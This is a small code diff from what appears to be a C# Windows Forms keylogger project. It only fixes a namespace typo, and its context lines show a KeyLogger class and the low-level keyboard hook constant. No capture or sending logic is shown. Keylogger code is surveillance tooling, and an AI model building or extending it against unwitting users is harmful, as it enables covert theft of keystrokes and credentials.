@@ -4,8 +4,8 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
-namespace WFormMyKyeLogger
-{
+namespace WFormMyKeyLogger
+{   
     class KeyLogger
     {
         private const int WH_KEYBOARD_LL = 13;
